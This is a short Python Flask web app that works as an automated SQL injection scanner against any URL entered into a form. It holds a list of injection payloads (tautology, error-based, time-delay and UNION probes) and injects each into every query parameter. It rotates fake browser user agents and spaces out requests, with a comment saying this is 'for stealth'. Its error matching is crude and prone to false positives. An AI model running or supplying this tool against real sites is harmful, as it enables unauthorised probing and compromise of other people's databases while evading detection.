from flask import Flask, render_template, request
import requests
import random
import time
from urllib.parse import urlparse, parse_qs, urlencode

app = Flask(__name__)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/58.0.3029.110",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/53.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 Safari/604.1.38",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/44.0.2403.157 Safari/537.36",
]

PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\" -- ",
    "\" OR \"1\"=\"1\" /*",
    "1' OR '1'='1",
    "1' OR '1'='1' -- ",
    "1' OR '1'='1' /*",
    "' AND 1=CONVERT(int, (SELECT @@version)) -- ",
    "' AND 1=CAST((SELECT @@version) AS int) -- ",
    "' WAITFOR DELAY '0:0:5'--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def send_request(url):
    headers = {'User-Agent': get_random_user_agent()}
    try:
        response = requests.get(url, headers=headers, timeout=15)
        return response
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None

def is_sql_error(text):
    sql_errors = ['sql syntax', 'mysql', 'syntax error', 'warning', 'error']
    text = text.lower()
    return any(err in text for err in sql_errors)

@app.route('/', methods=['GET', 'POST'])
def index():
    result = None
    if request.method == 'POST':
        url_input = request.form['url']
        parsed_url = urlparse(url_input)
        query_params = parse_qs(parsed_url.query)

        if not query_params:
            result = ["No parameters found in the URL. Please enter a URL with parameters."]
            return render_template('index.html', result=result)

        base_url = parsed_url._replace(query='').geturl()
        base_response = send_request(url_input)
        if not base_response:
            result = ["Failed to get a response from the URL."]
            return render_template('index.html', result=result)

        normal_len = len(base_response.text)
        vulns = []

        for param in query_params:
            for payload in PAYLOADS:
                test_params = {k: v[0] for k, v in query_params.items()}
                test_params[param] = payload
                test_url = parsed_url._replace(query=urlencode(test_params)).geturl()
                resp = send_request(test_url)

                if resp:
                    resp_text = resp.text
                    resp_len = len(resp_text)
                    if abs(resp_len - normal_len) > 50 or is_sql_error(resp_text):
                        vulns.append(f"Possible SQL Injection found in param '{param}' with payload '{payload}'")

                time.sleep(1.2)  # small delay for stealth

        result = vulns or ["No significant vulnerabilities found."]
    return render_template('index.html', result=result)

if __name__ == "__main__":
    app.run(debug=True)
